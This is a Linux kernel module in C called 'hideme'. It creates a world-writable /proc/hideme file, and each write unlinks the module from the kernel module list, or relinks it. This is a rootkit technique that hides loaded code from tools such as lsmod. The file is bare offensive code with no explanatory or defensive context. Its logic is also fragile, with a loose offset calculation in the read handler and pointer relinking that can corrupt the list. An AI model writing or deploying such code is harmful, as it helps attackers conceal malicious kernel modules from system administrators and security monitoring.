#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>

#include <linux/string.h>

MODULE_LICENSE("GPL");

#define	TURE	1
#define FALSE	0

int is_hide = FALSE;
struct list_head *this = NULL;

static int hideme_proc_open(struct inode *inode, struct file *file) {
	return 0;
}

static int hideme_proc_release(struct inode *inode, struct file *file) {
	return 0;
}

static ssize_t hideme_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) {
	char buf[256];
	ssize_t toread;

	sprintf(buf, "Hide status: %d\n", is_hide);
	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT;

	*offset = *offset + toread;
	return toread;
}

static ssize_t hideme_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) {
	char buf[128];

	if (*offset != 0 || size > 128)
		return -EFAULT;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT;

	if (is_hide) {
		(&THIS_MODULE->list)->prev->next = &THIS_MODULE->list;
		(&THIS_MODULE->list)->next->prev = &THIS_MODULE->list;
	}
	else {
		(&THIS_MODULE->list)->prev->next = (&THIS_MODULE->list)->next;
		(&THIS_MODULE->list)->next->prev = (&THIS_MODULE->list)->prev;
	}

	is_hide = !is_hide;
	*offset = strlen(buf);
	return *offset;
}

static const struct file_operations hideme_fops = {
	.owner =	THIS_MODULE,
	.open =		hideme_proc_open,
	.read =		hideme_proc_read,
	.write =	hideme_proc_write,
	.llseek =	seq_lseek,
	.release =	hideme_proc_release,
};

static int __init hideme_init(void) {
	proc_create("hideme", S_IRUGO | S_IWUGO, NULL, &hideme_fops);
	return 0;
}

static void __exit hideme_exit(void) {
	if (is_hide) {
		(&THIS_MODULE->list)->prev->next = &THIS_MODULE->list;
		(&THIS_MODULE->list)->next->prev = &THIS_MODULE->list;
	}

	remove_proc_entry("hideme", NULL);
}

module_init(hideme_init);
module_exit(hideme_exit);
